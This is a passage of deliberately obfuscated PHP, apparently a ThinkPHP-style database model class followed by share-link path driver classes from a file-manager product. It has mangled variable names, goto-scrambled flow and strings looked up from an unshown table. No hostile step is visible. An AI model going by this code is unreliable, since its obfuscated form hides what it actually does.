$B¸ÎÕ‘Ë´× = $this->getDbFields(); foreach ($eâˆŸÕÂÎó as $fìäÏÏ»¯³ => $Aƒ¡Š”³±) { if (!in_array($fìäÏÏ»¯³, $B¸ÎÕ‘Ë´×)) { unset($eâˆŸÕÂÎó[$fìäÏÏ»¯³]); } elseif (MAGIC_QUOTES_GPC && is_string($Aƒ¡Š”³±)) { $eâˆŸÕÂÎó[$fìäÏÏ»¯³] = stripslashes($Aƒ¡Š”³±); } } } $this->autoOperation($eâˆŸÕÂÎó, $F‰İ©Êˆ…Ÿ); $this->data = $eâˆŸÕÂÎó; goto Aˆ¢àâÓ¯; CÌ¬Ç‰êÑ : if (isset($B¸ÎÕ‘Ë´×)) { if (is_string($B¸ÎÕ‘Ë´×)) { $B¸ÎÕ‘Ë´× = explode($cğ‹åâĞˆ«[47], $B¸ÎÕ‘Ë´×); } if (think_config($cğ‹åâĞˆ«[305])) { $B¸ÎÕ‘Ë´×[] = think_config($cğ‹åâĞˆ«[306]); } foreach ($eâˆŸÕÂÎó as $fìäÏÏ»¯³ => $Aƒ¡Š”³±) { if (!in_array($fìäÏÏ»¯³, $B¸ÎÕ‘Ë´×)) { unset($eâˆŸÕÂÎó[$fìäÏÏ»¯³]); } } } if (!$this->autoValidation($eâˆŸÕÂÎó, $F‰İ©Êˆ…Ÿ)) { return !1; } if (!$this->autoCheckToken($eâˆŸÕÂÎó)) { $this->error = think_lang($cğ‹åâĞˆ«[307]); return !1; } goto cØÂ©‚©Úâ; Aˆ¢àâÓ¯: return $eâˆŸÕÂÎó; goto a…êİØ¬ùÎ; a…êİØ¬ùÎ: } public function autoCheckToken($DÙ·İƒÆá) { $dºªéÃÛ =& $_SERVER[Ü˜]; if (isset($this->options[$dºªéÃÛ[308]]) && !$this->options[$dºªéÃÛ[308]]) { return !0; } if (think_config($dºªéÃÛ[305])) { $F™ìçĞ÷ = think_config($dºªéÃÛ[306]); if (!isset($DÙ·İƒÆá[$F™ìçĞ÷]) || Session::get($F™ìçĞ÷)) { return !1; } list($féÂ…Ô°œ, $d‚‰¡ĞÊ„ñ) = explode($dºªéÃÛ[81], $DÙ·İƒÆá[$F™ìçĞ÷]); if ($d‚‰¡ĞÊ„ñ && Session::get($F™ìçĞ÷ . $dºªéÃÛ[105] . $féÂ…Ô°œ) === $d‚‰¡ĞÊ„ñ) { Session::remove($F™ìçĞ÷ . $dºªéÃÛ[105] . $féÂ…Ô°œ); return !0; } if (think_config($dºªéÃÛ[309])) { Session::remove($F™ìçĞ÷ . $dºªéÃÛ[105] . $féÂ…Ô°œ); } return !1; } return !0; } public function regex($BĞ¿¯“­Õó, $b¸Üæ›­›) { $cÉˆ§™¥·‚ =& $_SERVER[Ü˜]; $eµ™«òƒ¢Û = array($cÉˆ§™¥·‚[310] => $cÉˆ§™¥·‚[311], $cÉˆ§™¥·‚[312] => $cÉˆ§™¥·‚[313], $cÉˆ§™¥·‚[314] => $cÉˆ§™¥·‚[315], $cÉˆ§™¥·‚[316] => $cÉˆ§™¥·‚[317], $cÉˆ§™¥·‚[318] => $cÉˆ§™¥·‚[319], $cÉˆ§™¥·‚[320] => $cÉˆ§™¥·‚[321], $cÉˆ§™¥·‚[322] => $cÉˆ§™¥·‚[323], $cÉˆ§™¥·‚[297] => $cÉˆ§™¥·‚[324], $cÉˆ§™¥·‚[325] => $cÉˆ§™¥·‚[326]); if (isset($eµ™«òƒ¢Û[strtolower($b¸Üæ›­›)])) { $b¸Üæ›­› = $eµ™«òƒ¢Û[strtolower($b¸Üæ›­›)]; } return preg_match($b¸Üæ›­›, $BĞ¿¯“­Õó) === 1; } private function autoOperation(&$B‘›Éí“‚², $FÓªö—Õè·) { $c×Ø¯¨ŒÛ =& $_SERVER[Ü˜]; if (!empty($this->options[$c×Ø¯¨ŒÛ[327]])) { $dÈ‚¤ƒ¿Ì = $this->options[$c×Ø¯¨ŒÛ[327]]; unset($this->options[$c×Ø¯¨ŒÛ[327]]); } elseif (!empty($this->_auto)) { $dÈ‚¤ƒ¿Ì = $this->_auto; } if (isset($dÈ‚¤ƒ¿Ì)) { foreach ($dÈ‚¤ƒ¿Ì as $CÇ„ÀÖ©â‚) { if (empty($CÇ„ÀÖ©â‚[2])) { $CÇ„ÀÖ©â‚[2] = THINK_MODEL_INSERT; } if ($FÓªö—Õè· == $CÇ„ÀÖ©â‚[2] || $CÇ„ÀÖ©â‚[2] == THINK_MODEL_BOTH) { switch (trim($CÇ„ÀÖ©â‚[3])) { case $c×Ø¯¨ŒÛ[328]: case $c×Ø¯¨ŒÛ[329]: $c‹”È¶ˆ½ê = isset($CÇ„ÀÖ©â‚[4]) ? (array) $CÇ„ÀÖ©â‚[4] : array(); if (isset($B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]])) { array_unshift($c‹”È¶ˆ½ê, $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]]); } if ($c×Ø¯¨ŒÛ[328] == $CÇ„ÀÖ©â‚[3]) { $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]] = call_user_func_array($CÇ„ÀÖ©â‚[1], $c‹”È¶ˆ½ê); } else { $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]] = call_user_func_array(array(&$this, $CÇ„ÀÖ©â‚[1]), $c‹”È¶ˆ½ê); } break; case $c×Ø¯¨ŒÛ[280]: $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]] = $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[1]]; break; case $c×Ø¯¨ŒÛ[330]: if ($c×Ø¯¨ŒÛ[33] === $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]]) { unset($B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]]); } break; case $c×Ø¯¨ŒÛ[331]: default: $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]] = $CÇ„ÀÖ©â‚[1]; } if (!1 === $B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]]) { unset($B‘›Éí“‚²[$CÇ„ÀÖ©â‚[0]]); } } } } return $B‘›Éí“‚²; } protected function autoValidation($EÏ¢ˆ³³İõ, $cËÛ†£ğ‹ë) { $AÇÌËËŠö =& $_SERVER[Ü˜]; if (!empty($this->options[$AÇÌËËŠö[332]])) { $B’ÀÓ‹†—° = $this->options[$AÇÌËËŠö[332]]; unset($this->options[$AÇÌËËŠö[332]]); } elseif (!empty($this->_validate)) { $B’ÀÓ‹†—° = $this->_validate; } if (isset($B’ÀÓ‹†—°)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B’ÀÓ‹†—° as $CçÒ‚£“©Ô => $c¯«ÖÊŒØ) { if (empty($c¯«ÖÊŒØ[5]) || $c¯«ÖÊŒØ[5] == THINK_MODEL_BOTH || $c¯«ÖÊŒØ[5] == $cËÛ†£ğ‹ë) { if (0 == strpos($c¯«ÖÊŒØ[2], $AÇÌËËŠö[333]) && strpos($c¯«ÖÊŒØ[2], $AÇÌËËŠö[334])) { $c¯«ÖÊŒØ[2] = think_lang(substr($c¯«ÖÊŒØ[2], 2, -1)); } $c¯«ÖÊŒØ[3] = isset($c¯«ÖÊŒØ[3]) ? $c¯«ÖÊŒØ[3] : THINK_EXISTS_VALIDATE; $c¯«ÖÊŒØ[4] = isset($c¯«ÖÊŒØ[4]) ? $c¯«ÖÊŒØ[4] : $AÇÌËËŠö[335]; switch ($c¯«ÖÊŒØ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($EÏ¢ˆ³³İõ, $c¯«ÖÊŒØ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($AÇÌËËŠö[33] != trim($EÏ¢ˆ³³İõ[$c¯«ÖÊŒØ[0]])) { if (!1 === $this->_validationField($EÏ¢ˆ³³İõ, $c¯«ÖÊŒØ)) { return !1; } } break; default: if (isset($EÏ¢ˆ³³İõ[$c¯«ÖÊŒØ[0]])) { if (!1 === $this->_validationField($EÏ¢ˆ³³İõ, $c¯«ÖÊŒØ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($a°Øº…„Ò£, $a»ì‹Ô‘ºó) { if (!1 === $this->_validationFieldItem($a°Øº…„Ò£, $a»ì‹Ô‘ºó)) { if ($this->patchValidate) { $this->error[$a»ì‹Ô‘ºó[0]] = $a»ì‹Ô‘ºó[2]; } else { $this->error = $a»ì‹Ô‘ºó[2]; return !1; } } return; } protected function _validationFieldItem($bÉ¯µäªµ, $FÍÃ£Ìê”´) { $AŸ‡óí¤ğâ =& $_SERVER[Ü˜]; switch (strtolower(trim($FÍÃ£Ìê”´[4]))) { case $AŸ‡óí¤ğâ[328]: case $AŸ‡óí¤ğâ[329]: $DëµôˆØ¹¥ = isset($FÍÃ£Ìê”´[6]) ? (array) $FÍÃ£Ìê”´[6] : array(); if (is_string($FÍÃ£Ìê”´[0]) && strpos($FÍÃ£Ìê”´[0], $AŸ‡óí¤ğâ[47])) { $FÍÃ£Ìê”´[0] = explode($AŸ‡óí¤ğâ[47], $FÍÃ£Ìê”´[0]); } if (is_array($FÍÃ£Ìê”´[0])) { foreach ($FÍÃ£Ìê”´[0] as $bí‹ŒäÚÂ›) { $F•æÌêòŠ±[$bí‹ŒäÚÂ›] = $bÉ¯µäªµ[$bí‹ŒäÚÂ›]; } array_unshift($DëµôˆØ¹¥, $F•æÌêòŠ±); } else { array_unshift($DëµôˆØ¹¥, $bÉ¯µäªµ[$FÍÃ£Ìê”´[0]]); } if ($AŸ‡óí¤ğâ[328] == $FÍÃ£Ìê”´[4]) { return call_user_func_array($FÍÃ£Ìê”´[1], $DëµôˆØ¹¥); } else { return call_user_func_array(array(&$this, $FÍÃ£Ìê”´[1]), $DëµôˆØ¹¥); } case $AŸ‡óí¤ğâ[336]: return $bÉ¯µäªµ[$FÍÃ£Ìê”´[0]] == $bÉ¯µäªµ[$FÍÃ£Ìê”´[1]]; case $AŸ‡óí¤ğâ[337]: if (is_string($FÍÃ£Ìê”´[0]) && strpos($FÍÃ£Ìê”´[0], $AŸ‡óí¤ğâ[47])) { $FÍÃ£Ìê”´[0] = explode($AŸ‡óí¤ğâ[47], $FÍÃ£Ìê”´[0]); } $D…´ÔùÉåš = array(); if (is_array($FÍÃ£Ìê”´[0])) { foreach ($FÍÃ£Ìê”´[0] as $bí‹ŒäÚÂ›) { $D…´ÔùÉåš[$bí‹ŒäÚÂ›] = $bÉ¯µäªµ[$bí‹ŒäÚÂ›]; } } else { $D…´ÔùÉåš[$FÍÃ£Ìê”´[0]] = $bÉ¯µäªµ[$FÍÃ£Ìê”´[0]]; } if (!empty($bÉ¯µäªµ[$this->getPk()])) { $D…´ÔùÉåš[$this->getPk()] = array($AŸ‡óí¤ğâ[338], $bÉ¯µäªµ[$this->getPk()]); } if ($this->where($D…´ÔùÉåš)->find()) { return !1; } return !0; default: return $this->check($bÉ¯µäªµ[$FÍÃ£Ìê”´[0]], $FÍÃ£Ìê”´[1], $FÍÃ£Ìê”´[4]); } } public function check($FÙ…Ğõ¾, $eòÎµ‘³“, $E–ÑİõùÏÓ = "\162\x65\x67\x65\x78") { $e©£‡Ùàò =& $_SERVER[Ü˜]; $E–ÑİõùÏÓ = strtolower(trim($E–ÑİõùÏÓ)); switch ($E–ÑİõùÏÓ) { case $e©£‡Ùàò[7]: case $e©£‡Ùàò[339]: $F®´®¶¥†ì = is_array($eòÎµ‘³“) ? $eòÎµ‘³“ : explode($e©£‡Ùàò[47], $eòÎµ‘³“); return $E–ÑİõùÏÓ == $e©£‡Ùàò[7] ? in_array($FÙ…Ğõ¾, $F®´®¶¥†ì) : !in_array($FÙ…Ğõ¾, $F®´®¶¥†ì); case $e©£‡Ùàò[340]: case $e©£‡Ùàò[341]: if (is_array($eòÎµ‘³“)) { $c«ä™óéë‡ = $eòÎµ‘³“[0]; $Eäñ¯¦Õˆ = $eòÎµ‘³“[1]; } else { list($c«ä™óéë‡, $Eäñ¯¦Õˆ) = explode($e©£‡Ùàò[47], $eòÎµ‘³“); } return $E–ÑİõùÏÓ == $e©£‡Ùàò[340] ? $FÙ…Ğõ¾ >= $c«ä™óéë‡ && $FÙ…Ğõ¾ <= $Eäñ¯¦Õˆ : $FÙ…Ğõ¾ < $c«ä™óéë‡ || $FÙ…Ğõ¾ > $Eäñ¯¦Õˆ; case $e©£‡Ùàò[342]: case $e©£‡Ùàò[343]: return $E–ÑİõùÏÓ == $e©£‡Ùàò[342] ? $FÙ…Ğõ¾ == $eòÎµ‘³“ : $FÙ…Ğõ¾ != $eòÎµ‘³“; case $e©£‡Ùàò[344]: $ešäëÑä¡ = mb_strlen($FÙ…Ğõ¾, $e©£‡Ùàò[345]); if (strpos($eòÎµ‘³“, $e©£‡Ùàò[47])) { list($c«ä™óéë‡, $Eäñ¯¦Õˆ) = explode($e©£‡Ùàò[47], $eòÎµ‘³“); return $ešäëÑä¡ >= $c«ä™óéë‡ && $ešäëÑä¡ <= $Eäñ¯¦Õˆ; } else { return $ešäëÑä¡ == $eòÎµ‘³“; } case $e©£‡Ùàò[346]: list($bñôÁ©­º¸, $BÕ„’µ”³ä) = explode($e©£‡Ùàò[47], $eòÎµ‘³“); if (!is_numeric($bñôÁ©­º¸)) { $bñôÁ©­º¸ = strtotime($bñôÁ©­º¸); } if (!is_numeric($BÕ„’µ”³ä)) { $BÕ„’µ”³ä = strtotime($BÕ„’µ”³ä); } return NOW_TIME >= $bñôÁ©­º¸ && NOW_TIME <= $BÕ„’µ”³ä; case $e©£‡Ùàò[347]: return in_array(get_client_ip(), explode($e©£‡Ùàò[47], $eòÎµ‘³“)); case $e©£‡Ùàò[348]: return !in_array(get_client_ip(), explode($e©£‡Ùàò[47], $eòÎµ‘³“)); case $e©£‡Ùàò[335]: default: return $this->regex($FÙ…Ğõ¾, $eòÎµ‘³“); } } public function query($eŠ»¡Ö†áŸ, $EÊ¶’§´© = false) { $cïÉ¥©—¤Ü =& $_SERVER[Ü˜]; if (!is_bool($EÊ¶’§´©) && !is_array($EÊ¶’§´©)) { $EÊ¶’§´© = func_get_args(); array_shift($EÊ¶’§´©); } $eŠ»¡Ö†áŸ = str_replace(array($cïÉ¥©—¤Ü[63], $cïÉ¥©—¤Ü[349]), $cïÉ¥©—¤Ü[50], $eŠ»¡Ö†áŸ); $eŠ»¡Ö†áŸ = $this->parseSql($eŠ»¡Ö†áŸ, $EÊ¶’§´©); return $this->db->query($eŠ»¡Ö†áŸ); } public function execute($cˆİ½¸Â‚”, $dÛÉÓÎÄĞí = false) { if (!is_bool($dÛÉÓÎÄĞí) && !is_array($dÛÉÓÎÄĞí)) { $dÛÉÓÎÄĞí = func_get_args(); array_shift($dÛÉÓÎÄĞí); } $cˆİ½¸Â‚” = $this->parseSql($cˆİ½¸Â‚”, $dÛÉÓÎÄĞí); return $this->db->execute($cˆİ½¸Â‚”); } protected function parseSql($E³º£™‡«õ, $C»†äã”‡) { $Fäó¿ ” =& $_SERVER[Ü˜]; if (!0 === $C»†äã”‡) { $b‡Øƒ ˜ÕÆ = $this->_parseOptions(); $E³º£™‡«õ = $this->db->parseSql($E³º£™‡«õ, $b‡Øƒ ˜ÕÆ); } elseif (is_array($C»†äã”‡)) { $C»†äã”‡ = array_map(array($this->db, $Fäó¿ ”[350]), $C»†äã”‡); $E³º£™‡«õ = vsprintf($E³º£™‡«õ, $C»†äã”‡); } else { $E³º£™‡«õ = strtr($E³º£™‡«õ, array($Fäó¿ ”[351] => $this->getTableName(), $Fäó¿ ”[352] => think_config($Fäó¿ ”[251]))); } $this->db->setModel($this->name); return $E³º£™‡«õ; } public function db($e‡‘œØÚø³ = '', $F›·“¯Ÿö­ = '', $FÆ²’ÅĞ» = array()) { goto BšÒæµÄÖ; Fö§³³‰Æ: $CÊ·ŒËÅÍË[$e‡‘œØÚø³] = $F›·“¯Ÿö­; $this->db = $e×Šµíª[$e‡‘œØÚø³]; $this->_after_db(); goto bì‘¼íäí­; fÔÜ›ÚÑ…: static $e×Šµíª = array(); if (!isset($e×Šµíª[$e‡‘œØÚø³]) || isset($e×Šµíª[$e‡‘œØÚø³]) && $F›·“¯Ÿö­ && $CÊ·ŒËÅÍË[$e‡‘œØÚø³] != $F›·“¯Ÿö­) { if (!empty($F›·“¯Ÿö­) && is_string($F›·“¯Ÿö­) && !1 === strpos($F›·“¯Ÿö­, $eÓ”œŞÇñ[8])) { $F›·“¯Ÿö­ = think_config($F›·“¯Ÿö­); } $e×Šµíª[$e‡‘œØÚø³] = Db::getInstance($F›·“¯Ÿö­); } elseif (NULL === $F›·“¯Ÿö­) { $e×Šµíª[$e‡‘œØÚø³]->close(); unset($e×Šµíª[$e‡‘œØÚø³]); return; } if (!empty($FÆ²’ÅĞ»)) { if (is_string($FÆ²’ÅĞ»)) { parse_str($FÆ²’ÅĞ», $FÆ²’ÅĞ»); } foreach ($FÆ²’ÅĞ» as $cª‹Œá§ËÑ => $dñ¬ªÙòÓ) { $this->setProperty($cª‹Œá§ËÑ, $dñ¬ªÙòÓ); } } goto Fö§³³‰Æ; BšÒæµÄÖ: $eÓ”œŞÇñ =& $_SERVER[Ü˜]; if ($eÓ”œŞÇñ[33] === $e‡‘œØÚø³ && $this->db) { return $this->db; } static $CÊ·ŒËÅÍË = array(); goto fÔÜ›ÚÑ…; bì‘¼íäí­: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto eË‡½™ˆÕÆ; eË‡½™ˆÕÆ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $cÍ¿Í±Îˆ = get_class($this); if ($cÍ¿Í±Îˆ == $_SERVER[Ü˜][353]) { return $this->name; } $this->name = substr($cÍ¿Í±Îˆ, 0, -5); } return $this->name; } public function getTableName() { $DôàÙ£ƒØ =& $_SERVER[Ü˜]; if (empty($this->trueTableName)) { $Fé½Ÿ”ªğ = !empty($this->tablePrefix) ? $this->tablePrefix : $DôàÙ£ƒØ[33]; if (!empty($this->tableName)) { $Fé½Ÿ”ªğ .= $this->tableName; } else { $Fé½Ÿ”ªğ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Fé½Ÿ”ªğ); } return (!empty($this->dbName) ? $this->dbName . $DôàÙ£ƒØ[105] : $DôàÙ£ƒØ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $dÌĞ¨•„Á =& $_SERVER[Ü˜]; return isset($this->fields[$dÌĞ¨•„Á[258]]) ? $this->fields[$dÌĞ¨•„Á[258]] : $this->pk; } public function getDbFields() { $BÉ˜«‘ù˜Ø =& $_SERVER[Ü˜]; if (isset($this->options[$BÉ˜«‘ù˜Ø[286]])) { $bï•Ã‹îî“ = $this->db->getFields($this->options[$BÉ˜«‘ù˜Ø[286]]); return $bï•Ã‹îî“ ? array_keys($bï•Ã‹îî“) : !1; } if ($this->fields) { $bï•Ã‹îî“ = $this->fields; unset($bï•Ã‹îî“[$BÉ˜«‘ù˜Ø[257]], $bï•Ã‹îî“[$BÉ˜«‘ù˜Ø[258]], $bï•Ã‹îî“[$BÉ˜«‘ù˜Ø[259]], $bï•Ã‹îî“[$BÉ˜«‘ù˜Ø[256]]); return $bï•Ã‹îî“; } return !1; } public function data($cõ…¶Ú— = '') { $böĞ¿Ü£› =& $_SERVER[Ü˜]; if ($böĞ¿Ü£›[33] === $cõ…¶Ú— && !empty($this->data)) { return $this->data; } if (is_object($cõ…¶Ú—)) { $cõ…¶Ú— = get_object_vars($cõ…¶Ú—); } elseif (is_string($cõ…¶Ú—)) { parse_str($cõ…¶Ú—, $cõ…¶Ú—); } elseif (!is_array($cõ…¶Ú—)) { think_exception(think_lang($böĞ¿Ü£›[278])); } $this->data = $cõ…¶Ú—; return $this; } public function join($a£¨áåÑßÀ) { $aéÁ»ß«·· =& $_SERVER[Ü˜]; if (is_array($a£¨áåÑßÀ)) { $this->options[$aéÁ»ß«··[289]] = $a£¨áåÑßÀ; } elseif (!empty($a£¨áåÑßÀ)) { $this->options[$aéÁ»ß«··[289]][] = $a£¨áåÑßÀ; } return $this; } public function union($E¼âŒ¶¹ì…, $A¯Û«ë‡£œ = false) { goto Aµ‚Ï‡Šãä; CôéêËàĞß: if (is_object($E¼âŒ¶¹ì…)) { $E¼âŒ¶¹ì… = get_object_vars($E¼âŒ¶¹ì…); } if (is_string($E¼âŒ¶¹ì…)) { $eÙ¯¹Ö¸Ëç = $E¼âŒ¶¹ì…; } elseif (is_array($E¼âŒ¶¹ì…)) { if (isset($E¼âŒ¶¹ì…[0])) { $this->options[$e«Ø¿Óç”„[354]] = array_merge($this->options[$e«Ø¿Óç”„[354]], $E¼âŒ¶¹ì…); return $this; } else { $eÙ¯¹Ö¸Ëç = $E¼âŒ¶¹ì…; } } else { think_exception(think_lang($e«Ø¿Óç”„[278])); } $this->options[$e«Ø¿Óç”„[354]][] = $eÙ¯¹Ö¸Ëç; goto aƒÒ¿ÜÍÒ‚; Aµ‚Ï‡Šãä: $e«Ø¿Óç”„ =& $_SERVER[Ü˜]; if (empty($E¼âŒ¶¹ì…)) { return $this; } if ($A¯Û«ë‡£œ) { $this->options[$e«Ø¿Óç”„[354]][$e«Ø¿Óç”„[355]] = !0; } goto CôéêËàĞß; aƒÒ¿ÜÍÒ‚: return $this; goto B¼Î•ˆ¬¾»; B¼Î•ˆ¬¾»: } public function cache($E‹¢ğ ª’î = true, $a„ÖÓÆ›À· = null, $D©ø›‘˜¿“ = '') { $BÅ¤šĞ³İÖ =& $_SERVER[Ü˜]; if (!1 !== $E‹¢ğ ª’î) { $this->options[$BÅ¤šĞ³İÖ[356]] = array($BÅ¤šĞ³İÖ[103] => $E‹¢ğ ª’î, $BÅ¤šĞ³İÖ[346] => $a„ÖÓÆ›À·, $BÅ¤šĞ³İÖ[29] => $D©ø›‘˜¿“); } return $this; } public function field($c¡â„Ä±ê†, $A®œ…†Á‘ = false) { $FÂ£¶áÈŞÊ =& $_SERVER[Ü˜]; if (!0 === $c¡â„Ä±ê†) { $B±›÷ñ«õÌ = $this->getDbFields(); $c¡â„Ä±ê† = $B±›÷ñ«õÌ ? $B±›÷ñ«õÌ : $FÂ£¶áÈŞÊ[192]; } elseif ($A®œ…†Á‘) { if (is_string($c¡â„Ä±ê†)) { $c¡â„Ä±ê† = explode($FÂ£¶áÈŞÊ[47], $c¡â„Ä±ê†); } $B±›÷ñ«õÌ = $this->getDbFields(); $c¡â„Ä±ê† = $B±›÷ñ«õÌ ? array_diff($B±›÷ñ«õÌ, $c¡â„Ä±ê†) : $c¡â„Ä±ê†; } $this->options[$FÂ£¶áÈŞÊ[280]] = $c¡â„Ä±ê†; return $this; } public function scope($e›Æ«õ›ïÚ = '', $A¸­­í®‚ = NULL) { $b­¦§ïª¬â =& $_SERVER[Ü˜]; if ($b­¦§ïª¬â[33] === $e›Æ«õ›ïÚ) { if (isset($this->_scope[$b­¦§ïª¬â[34]])) { $BÁó¾»ÃÂ = $this->_scope[$b­¦§ïª¬â[34]]; } else { return $this; } } elseif (is_string($e›Æ«õ›ïÚ)) { $eŠ„ƒßŠÙ… = explode($b­¦§ïª¬â[47], $e›Æ«õ›ïÚ); $BÁó¾»ÃÂ = array(); foreach ($eŠ„ƒßŠÙ… as $d…“¥œí­õ) { if (!isset($this->_scope[$d…“¥œí­õ])) { continue; } $BÁó¾»ÃÂ = array_merge($BÁó¾»ÃÂ, $this->_scope[$d…“¥œí­õ]); } if (!empty($A¸­­í®‚) && is_array($A¸­­í®‚)) { $BÁó¾»ÃÂ = array_merge($BÁó¾»ÃÂ, $A¸­­í®‚); } } elseif (is_array($e›Æ«õ›ïÚ)) { $BÁó¾»ÃÂ = $e›Æ«õ›ïÚ; } if (is_array($BÁó¾»ÃÂ) && !empty($BÁó¾»ÃÂ)) { $this->options = array_merge($this->options, array_change_key_case($BÁó¾»ÃÂ)); } return $this; } public function where($CÇÃÏ‘Š•é, $b¾ÙŸ ŞÌê = null) { $a—ø¢ª‚ =& $_SERVER[Ü˜]; if (!is_null($b¾ÙŸ ŞÌê) && is_string($CÇÃÏ‘Š•é)) { if (!is_array($b¾ÙŸ ŞÌê)) { $b¾ÙŸ ŞÌê = func_get_args(); array_shift($b¾ÙŸ ŞÌê); } $b¾ÙŸ ŞÌê = array_map(array($this->db, $a—ø¢ª‚[350]), $b¾ÙŸ ŞÌê); $CÇÃÏ‘Š•é = vsprintf($CÇÃÏ‘Š•é, $b¾ÙŸ ŞÌê); } elseif (is_object($CÇÃÏ‘Š•é)) { $CÇÃÏ‘Š•é = get_object_vars($CÇÃÏ‘Š•é); } elseif (is_array($CÇÃÏ‘Š•é)) { foreach ($CÇÃÏ‘Š•é as $Dâ„Åì“¾¡ => $F–Î±¿È•ë) { if ((is_numeric($Dâ„Åì“¾¡) || !$Dâ„Åì“¾¡) && is_string($F–Î±¿È•ë)) { if (strpos($F–Î±¿È•ë, $a—ø¢ª‚[357]) === 0) { continue; } think_trace($a—ø¢ª‚[358], $a—ø¢ª‚[33], $a—ø¢ª‚[46]); die; } } } if (is_string($CÇÃÏ‘Š•é) && $a—ø¢ª‚[33] != $CÇÃÏ‘Š•é) { $BŞœÇ¸’â¶ = array(); $BŞœÇ¸’â¶[$a—ø¢ª‚[359]] = $CÇÃÏ‘Š•é; $CÇÃÏ‘Š•é = $BŞœÇ¸’â¶; } if (isset($this->options[$a—ø¢ª‚[282]])) { $this->options[$a—ø¢ª‚[282]] = array_merge($this->options[$a—ø¢ª‚[282]], $CÇÃÏ‘Š•é); } else { $this->options[$a—ø¢ª‚[282]] = $CÇÃÏ‘Š•é; } return $this; } public function limit($CîØ²°¯, $fŸÎëŠİØ = null) { $dêò­äßÕ‡ =& $_SERVER[Ü˜]; $this->options[$dêò­äßÕ‡[299]] = is_null($fŸÎëŠİØ) ? $CîØ²°¯ : $CîØ²°¯ . $dêò­äßÕ‡[47] . $fŸÎëŠİØ; return $this; } public function page($DÌŒ«™Œ‘÷, $c×‰ùÄÂœÜ = null) { $f‹ÀÌà£Ú =& $_SERVER[Ü˜]; $this->options[$f‹ÀÌà£Ú[360]] = is_null($c×‰ùÄÂœÜ) ? $DÌŒ«™Œ‘÷ : $DÌŒ«™Œ‘÷ . $f‹ÀÌà£Ú[47] . $c×‰ùÄÂœÜ; return $this; } public function comment($eªÄ¿£öÛ©) { $this->options[$_SERVER[Ü˜][361]] = $eªÄ¿£öÛ©; return $this; } public function setProperty($e¯îøÈ‚Ìß, $D¼°ñƒº¦°) { if (property_exists($this, $e¯îøÈ‚Ìß)) { $this->{$e¯îøÈ‚Ìß} = $D¼°ñƒº¦°; } return $this; } } goto F®šš‰Û»ª; dÎá®¯ã¼œ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($DÆÆ™Â¾°) { $this->pathParse = $DÆÆ™Â¾°; $this->model = Model($_SERVER[Ü˜][1207]); } protected function infoParse($Fè × ØÆĞ, $DáµÚØÆ¹‹ = false, $d–ÜÆ™Ş = false) { $Câˆ½°½ñ¿ =& $_SERVER[Ü˜]; return Action($Câˆ½°½ñ¿[1071])->sharePathInfo($this->pathParse[$Câˆ½°½ñ¿[86]], !0); } public function listPath($dâÖ¡„«á, $Bë»‹ÉÜìİ = false) { $E±×¹ˆ =& $_SERVER[Ü˜]; $BùÉ¦ô°šÜ = parent::listPath($dâÖ¡„«á, $Bë»‹ÉÜìİ); foreach ($BùÉ¦ô°šÜ as $fàÓõ‚’ÑØ => $añ›âóÉ) { if (!in_array($fàÓõ‚’ÑØ, array($E±×¹ˆ[84], $E±×¹ˆ[85]))) { continue; } foreach ($añ›âóÉ as $Cé¶’‹çƒ => $DÇŠŒÈÖôĞ) { $BùÉ¦ô°šÜ[$fàÓõ‚’ÑØ][$Cé¶’‹çƒ] = Action($E±×¹ˆ[1071])->shareItemInfo($DÇŠŒÈÖôĞ); } } return $BùÉ¦ô°šÜ; } public function listAll($bøù…Ëô‹Á) { goto cŠ‹ô¯Êùì; bøä‘º„¹: return $CÙ£¹ÍáéÂ; goto D©‹æ´É„„; BŠ©Â“¨ù™: $CÙ£¹ÍáéÂ = $this->model->listAll($bøù…Ëô‹Á); foreach ($CÙ£¹ÍáéÂ as &$aÚ‘Ùš†•£) { $aÚ‘Ùš†•£[$fø´ÃÔ”[95]] = Action($fø´ÃÔ”[1071])->shareItemInfo($aÚ‘Ùš†•£[$fø´ÃÔ”[95]]); } unset($aÚ‘Ùš†•£); goto bøä‘º„¹; cŠ‹ô¯Êùì: $fø´ÃÔ” =& $_SERVER[Ü˜]; $B–­Ïˆ = IO::info($this->pathParse[$fø´ÃÔ”[86]]); if (!$B–­Ïˆ) { return array(); } goto BŠ©Â“¨ù™; D©‹æ´É„„: } } class PathDriverDriverShareItem { public function __construct($e¡ùèÛÚ¤) { $this->pathParse = $e¡ùèÛÚ¤; } public function __call($cœæÈŠİéë, $F¾®ÜÎ±Áİ) { $Dçœê„¡‡Ä =& $_SERVER[Ü˜]; if (method_exists($this, $cœæÈŠİéë)) { return; } $eŸÃÊÍîÓÂ = call_user_func_array(array($Dçœê„¡‡Ä[1216], $cœæÈŠİéë), $F¾®ÜÎ±Áİ); $dÈ®Êö±Í¦ = array($Dçœê„¡‡Ä[1217], $Dçœê„¡‡Ä[1218], $Dçœê„¡‡Ä[1219], $Dçœê„¡‡Ä[1220], $Dçœê„¡‡Ä[527], $Dçœê„¡‡Ä[529], $Dçœê„¡‡Ä[1221], $Dçœê„¡‡Ä[117], $Dçœê„¡‡Ä[1222], $Dçœê„¡‡Ä[1223]); 